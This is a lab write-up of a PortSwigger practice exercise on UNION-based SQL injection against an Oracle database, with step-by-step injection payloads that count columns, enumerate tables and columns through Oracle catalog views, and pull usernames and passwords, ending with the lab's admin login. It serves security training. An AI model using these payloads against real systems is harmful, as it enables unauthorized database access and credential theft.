# SQL Injection Attack — Listing Database Contents on Oracle

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Find the administrator username and password by enumerating the Oracle database, then log in.

---

## Lab

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

**UNION-based SQL injection** with full database enumeration on Oracle. Oracle does not have `information_schema` — instead it uses its own catalog views:

```sql
-- List all tables (Oracle)
SELECT table_name FROM all_tables

-- List columns of a table (Oracle)
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

> **Important:** On Oracle every SELECT must have a FROM clause. Use `FROM dual` when selecting constant values, or use the actual catalog table.

---

## Steps to Solve

---

**Step 1 — Find Injection Point and Column Count**

Injection point: **product category filter**

```
/filter?category=Gifts'
```

Find columns with ORDER BY:

```
/filter?category=Gifts' ORDER BY 1--
/filter?category=Gifts' ORDER BY 2--
/filter?category=Gifts' ORDER BY 3--
```

Confirm with UNION NULL — Oracle requires FROM clause:

```
/filter?category=Gifts' UNION SELECT NULL,NULL FROM dual--
```

Columns found: **2**

<img width="1605" height="475" alt="image" src="https://github.com/user-attachments/assets/631f58f5-892c-48e9-8f8b-761db7d16a48" />

---

**Step 2 — Confirm String Columns**

```
/filter?category=Gifts' UNION SELECT 'a','b' FROM dual--
```

Both columns display strings.

<img width="786" height="216" alt="image" src="https://github.com/user-attachments/assets/98239835-99b1-43d2-b5c4-ced958478106" />

---

**Step 3 — List All Tables**

On Oracle use `all_tables` instead of `information_schema.tables`:

```
/filter?category=Gifts' UNION SELECT table_name,NULL FROM all_tables--
```

All table names appear in the response. Look for a users-related table.

<img width="1830" height="4661" alt="0a4d00f8035da66580a412430074006d web-security-academy net_filter_category=Gifts%27%20UNION%20SELECT%20table_name,NULL%20FROM%20all_tables--" src="https://github.com/user-attachments/assets/403dd0e1-d0b5-41aa-b9c9-681def802d11" />

Table found: **USERS_OKKWJK** (Oracle table names are often uppercase)

---

**Step 4 — List Columns of Target Table**

On Oracle use `all_tab_columns` instead of `information_schema.columns`:

```
/filter?category=Gifts' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_OKKWJK'--
```

Column names appear in the response.

<img width="405" height="586" alt="image" src="https://github.com/user-attachments/assets/7a1475aa-62b8-41dd-a976-dff87b4a32da" />

Columns found: **USERNAME_OESKNV**, **PASSWORD_SMVDGO**

---

**Step 5 — Extract Usernames and Passwords**

```
/filter?category=Gifts' UNION SELECT USERNAME_OESKNV,PASSWORD_SMVDGO FROM USERS_OKKWJK--
```

All usernames and passwords appear in the page response.

<img width="477" height="255" alt="image" src="https://github.com/user-attachments/assets/6d7c3e38-25de-472f-9b1f-5c72fe19fe3d" />

---

**Step 6 — Log In as Administrator**

- **Username:** `administrator`
- **Password:** `idfimvyhl6ua5m6lqw12`

---

**Lab Solved**

<img width="1496" height="722" alt="image" src="https://github.com/user-attachments/assets/afd50b28-9737-4974-bea8-d484db317802" />

---

## Oracle vs Non-Oracle Comparison

| Goal | Non-Oracle | Oracle |
|------|-----------|--------|
| List tables | `FROM information_schema.tables` → `table_name` | `FROM all_tables` → `table_name` |
| List columns | `FROM information_schema.columns WHERE table_name='x'` → `column_name` | `FROM all_tab_columns WHERE table_name='X'` → `column_name` |
| Dummy FROM | Not needed | `FROM dual` |
| Table name case | lowercase | UPPERCASE |
| Comment | `--` | `--` |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
